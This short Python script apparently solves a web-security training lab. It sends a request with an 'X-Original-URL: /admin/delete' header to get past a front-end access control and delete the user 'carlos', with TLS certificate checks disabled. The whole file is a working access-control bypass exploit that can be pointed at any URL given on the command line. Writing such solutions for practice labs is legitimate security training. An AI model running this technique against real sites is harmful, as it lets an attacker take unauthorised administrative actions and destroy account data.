import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def delete_user(seesion,url):
    url_delete=url+"/?username=carlos"
    headers={"X-ORIGINAL-URL":"/admin/delete"}
    #deleted user
    respons=seesion.get(url_delete,headers=headers,verify=False)
    #check if deleted
    respons=seesion.get(url,verify=False)
    respons=respons.text
    if "Congratulations, you solved the lab!" in respons:
        print('(+) user deleted successfully')
        print("(+) Congratulations, you solved the lab!")

    else:
        print("error while trying to deleting user")
def main():
    if len(sys.argv)!=2:
        print('(+) Usage %s <url>'  %sys.argv[0])
        print('(+) Example %s www.example.com'%sys.argv[0] )
        sys.exit(-1)
    url=sys.argv[1]
    session=requests.session()
    delete_user(session,url)

if __name__=="__main__":
    main()